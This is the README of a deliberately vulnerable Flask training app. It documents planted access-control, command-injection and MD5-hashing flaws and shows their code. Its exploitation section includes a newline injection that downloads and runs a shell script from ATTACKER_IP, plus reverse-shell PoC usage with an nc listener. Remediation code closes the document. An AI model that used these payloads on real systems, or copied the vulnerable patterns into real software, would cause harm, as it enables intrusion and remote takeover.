# 🛡️ SecurePanel

<div align="center">

![Python](https://img.shields.io/badge/Python-3.8+-blue.svg)
![Flask](https://img.shields.io/badge/Flask-2.0+-green.svg)
![License](https://img.shields.io/badge/License-MIT-yellow.svg)
![Platform](https://img.shields.io/badge/Platform-Linux%20%7C%20Windows-lightgrey.svg)

**A deliberately vulnerable Flask web application for security testing and educational purposes.**

[Features](#-features) • [Installation](#-installation) • [Vulnerabilities](#-vulnerabilities) • [Exploitation](#-exploitation) • [PoC Script](#-poc-script) • [Remediation](#-remediation)

</div>

---

## ⚠️ Disclaimer

> **This application is intentionally vulnerable and should ONLY be used in controlled environments for educational purposes, penetration testing practice, or security research. Never deploy this on production systems or networks you don't own.**

---

## 📋 Features

- 🔐 User authentication system with session management
- 👥 User profile management
- 🛠️ Admin panel with system utilities
- 📊 Network diagnostics tools (ping, DNS lookup, traceroute)
- 📁 Backup management system
- 📋 Log viewer
- ⚙️ Service manager

---

## 🚀 Installation

### Prerequisites

- Python 3.8+
- Flask

### Quick Start

```bash
# Clone the repository
git clone https://github.com/V01DsTh3/SecurePanel.git

# Navigate to the webapp directory
cd SecurePanel/webapp

# Install dependencies (if needed)
pip install flask

# Start the application
python3 app.py
```

The application will be available at `http://localhost:8888`

### Default Credentials

| Username | Password | Role |
|----------|----------|------|
| admin | admin123 | admin |
| Tom | firefighter123 | user |

---

## 🔓 Vulnerabilities

SecurePanel contains the following intentional security vulnerabilities:

| Vulnerability | Location | OWASP Category |
|--------------|----------|----------------|
| **Broken Access Control** | `/api/profile/update` | A01:2021 |
| **Command Injection** | `/admin/system/diagnostics` | A03:2021 |
| **Weak Password Hashing** | Authentication system | A02:2021 |
| **Insufficient Input Validation** | Multiple endpoints | A03:2021 |

### 1. Broken Access Control (BAC)

The profile update endpoint accepts a `role` parameter from the client without proper authorization checks. A regular user can escalate their privileges to admin by modifying the POST request.

**Vulnerable Code:**
```python
@app.route('/api/profile/update', methods=['POST'])
def update_profile():
    user_id = request.form.get('user_id', type=int)
    new_role = request.form.get('role')  # No authorization check!
    
    if new_role and new_role in ['user', 'admin']:
        users[user_id]['role'] = new_role  # Direct assignment
```

### 2. Command Injection

The network diagnostics feature passes user input directly to system commands with only a bypassable blacklist filter.

**Vulnerable Code:**
```python
def sanitize_input(user_input):
    blacklist = [';', '|', '&', '`', '$', '>', '<', '!', '\\']
    # Newline character (%0a) is NOT blocked!
    for char in blacklist:
        sanitized = sanitized.replace(char, '')
    return sanitized

# Later...
command = f"ping -c 2 {target}"
output = os.popen(command).read()
```

**Bypass:** Use newline character (`%0a` or `\n`) to inject additional commands.

### 3. Weak Password Hashing

Passwords are hashed using MD5 without salt, making them vulnerable to rainbow table attacks.

```python
def md5(password):
    return hashlib.md5(password.encode()).hexdigest()
```

---

## 💀 Exploitation

### Manual Exploitation

#### Step 1: Login with Valid Credentials
```
Username: Tom
Password: firefighter123
```

#### Step 2: Escalate to Admin (BAC)

Intercept the profile update request with Burp Suite and modify:
```
POST /api/profile/update HTTP/1.1

user_id=0&new_username=Tom&role=admin
```

#### Step 3: Command Injection

Navigate to **Admin Panel → Network Diagnostics** and inject commands using newline bypass:

```
127.0.0.1
id
```

Or for a reverse shell:
```
127.0.0.1
curl -o /tmp/shell.sh http://ATTACKER_IP:8081/shell.sh
bash /tmp/shell.sh
```

---

## 🔧 PoC Script

An automated exploit script is provided in the `webapp_poc` directory.

### Usage

```bash
cd webapp_poc

# Show help
python3 securepanel_poc.py -h
```

### Broken Access Control Only

```bash
python3 securepanel_poc.py -t <target_ip> -P <target_port> -u <username> -p <password>
```

### Full Exploit with Reverse Shell

**Terminal 1 - Start listener:**
```bash
nc -lvnp 9001
```

**Terminal 2 - Run exploit:**
```bash
python3 securepanel_poc.py -t <target_ip> -P <target_port> -u <username> -p <password> -r -a <listener_ip> -v <listener_port>
```

### Example

```bash
# Listener
nc -lvnp 9001

# Exploit
python3 securepanel_poc.py -t 192.168.1.100 -P 8888 -u Tom -p firefighter123 -r -a 192.168.1.50 -v 9001
```

### PoC Arguments

| Argument | Description |
|----------|-------------|
| `-t, --RHOSTS` | Target IP address |
| `-P, --RPORT` | Target port (default: 8888) |
| `-u, --username` | Username for authentication |
| `-p, --password` | Password for authentication |
| `-r, --reverse_shell` | Enable reverse shell payload |
| `-a, --VHOST` | Attacker IP for reverse shell |
| `-v, --VPORT` | Attacker port for listener |

---

## 🛠️ Remediation

### Fixing Broken Access Control

```python
@app.route('/api/profile/update', methods=['POST'])
def update_profile():
    # Use session data, not form input
    user_id = session.get('user_id')
    
    # Server-side authorization check
    if new_role and session.get('role') != 'admin':
        return jsonify({'error': 'Unauthorized'}), 403
```

### Fixing Command Injection

```python
import subprocess
import re

def system_diagnostics():
    target = request.form.get('target')
    
    # Whitelist validation
    if not re.match(r'^[a-zA-Z0-9.-]+$', target):
        return 'Invalid target format', 400
    
    # Parameterized execution - shell=False
    result = subprocess.run(
        ['ping', '-c', '2', target],
        capture_output=True,
        text=True,
        timeout=10
    )
```

### Fixing Weak Password Hashing

```python
from werkzeug.security import generate_password_hash, check_password_hash

def hash_password(password):
    return generate_password_hash(password, method='pbkdf2:sha256:600000')
```

---

## 📁 Project Structure

```
SecurePanel/
├── webapp/
│   ├── app.py              # Main Flask application
│   ├── users.json          # User database
│   ├── static/
│   │   └── css/
│   │       └── style.css   # Styling
│   └── templates/
│       ├── index.html
│       ├── login.html
│       ├── dashboard.html
│       ├── profile.html
│       ├── admin.html
│       ├── diagnostics.html
│       ├── logs.html
│       ├── backup.html
│       └── services.html
├── webapp_poc/
│   └── securepanel_poc.py  # Automated exploit script
└── README.md
```

---

## 📚 Learning Resources

- [OWASP Top 10](https://owasp.org/Top10/)
- [OWASP Testing Guide](https://owasp.org/www-project-web-security-testing-guide/)
- [PortSwigger Web Security Academy](https://portswigger.net/web-security)
- [HackTheBox](https://www.hackthebox.com/)

---

## 📄 License

This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.

---

## 🤝 Contributing

Contributions are welcome! Feel free to submit issues or pull requests.

---

<div align="center">

**⭐ Star this repository if you found it helpful!**

Made for educational purposes only.

</div>

